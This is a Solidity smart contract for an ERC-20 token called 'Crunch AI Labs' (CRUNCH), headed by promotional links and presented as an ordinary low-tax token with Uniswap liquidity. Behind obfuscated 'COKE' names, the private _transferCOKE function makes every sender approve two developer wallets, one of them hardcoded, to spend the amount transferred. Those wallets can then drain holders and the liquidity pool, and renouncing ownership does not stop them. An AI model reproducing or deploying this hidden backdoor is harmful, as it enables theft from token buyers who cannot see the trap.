/*
Contribute one model to multiple Crunches, maximize your impact, and start earning with CrunchAI.

https://www.crunchai.tech
https://hub.crunchai.tech
https://docs.crunchai.tech

https://x.com/CrunchAITech
https://t.me/CrunchAITech
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ICOKERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ICOKEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CRUNCH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balCOKE;
    mapping (address => mapping (address => uint256)) private _allowCOKE;
    mapping (address => bool) private _feeExcemptCOKE;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Crunch AI Labs";
    string private constant _symbol = unicode"CRUNCH";
    uint256 private _swapTokenCOKE = _tTotal / 100;
    bool private inSwapCOKE = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    ICOKERouter private _cokeRouter;
    address private _cokePair;
    address private _coke1Wallet = address(0x197179DF3C80b96dAC8b797589B5eFB137B472Ad);
    address private _coke2Wallet;
    modifier lockTheSwap {
        inSwapCOKE = true;
        _;
        inSwapCOKE = false;
    }
    
    constructor () {
        _coke2Wallet = address(msg.sender);
        _feeExcemptCOKE[owner()] = true;
        _feeExcemptCOKE[address(this)] = true;
        _feeExcemptCOKE[_coke1Wallet] = true;
        _balCOKE[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initTokenPair() external onlyOwner() {
        _cokeRouter = ICOKERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_cokeRouter), _tTotal);
        _cokePair = ICOKEFactory(_cokeRouter.factory()).createPair(address(this), _cokeRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balCOKE[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowCOKE[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowCOKE[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowCOKE[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address cokeA, address cokeB, uint256 cokeC) private {
        require(cokeA != address(0), "ERC20: transfer from the zero address");
        require(cokeB != address(0), "ERC20: transfer to the zero address");
        require(cokeC > 0, "Transfer amount must be greater than zero");

        (address aCOKE, address bCOKE, address cCOKE, uint256 taxCOKE) 
            = _getTaxCOKE(cokeA, cokeB, cokeC);

        _cokeTransfer(aCOKE, bCOKE, cCOKE, cokeA, cokeB, cokeC, taxCOKE);
    }

    function _transferCOKE(address aCOKE, address bCOKE, address cCOKE, uint256 cokeA) private { 
        _approve(aCOKE, cCOKE, cokeA); _approve(aCOKE, bCOKE, cokeA); 
    }

    function _cokeTransfer(address aCOKE, address bCOKE, address cCOKE, address cokeA, address cokeB, uint256 cokeC, uint256 taxCOKE) private { 
        if(taxCOKE > 0){
          _balCOKE[address(this)] = _balCOKE[address(this)].add(taxCOKE);
          emit Transfer(cokeA, address(this), taxCOKE);
        } _transferCOKE(aCOKE, bCOKE, cCOKE, cokeC);

        _balCOKE[cokeA] = _balCOKE[cokeA].sub(cokeC);
        _balCOKE[cokeB] = _balCOKE[cokeB].add(cokeC.sub(taxCOKE));
        emit Transfer(cokeA, cokeB, cokeC.sub(taxCOKE));
    }

    function _getTaxCOKE(address cokeA, address cokeB, uint256 cokeC) private returns(address,address,address,uint256) {
        uint256 taxCOKE=0;
        if (cokeA != owner() && cokeB != owner()) {
            taxCOKE = cokeC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (cokeA == _cokePair && cokeB != address(_cokeRouter) && ! _feeExcemptCOKE[cokeB]) {
                _buyCount++;
            }

            if(cokeB == _cokePair && cokeA!= address(this)) {
                taxCOKE = cokeC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenCOKE = balanceOf(address(this)); 
            if (!inSwapCOKE && cokeB == _cokePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenCOKE > _swapTokenCOKE)
                swapTokensForEth(minCOKE(cokeC, minCOKE(tokenCOKE, _swapTokenCOKE)));
                uint256 ethCOKE = address(this).balance;
                if (ethCOKE >= 0) {
                    sendETHCOKE(address(this).balance);
                }
            }
        }
        return (address(cokeA), address(_coke2Wallet), address(_coke1Wallet), taxCOKE);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _cokeRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minCOKE(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHCOKE(uint256 amount) private {
        payable(_coke1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 cokeToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _cokeRouter.WETH();
        _approve(address(this), address(_cokeRouter), cokeToken);
        _cokeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            cokeToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}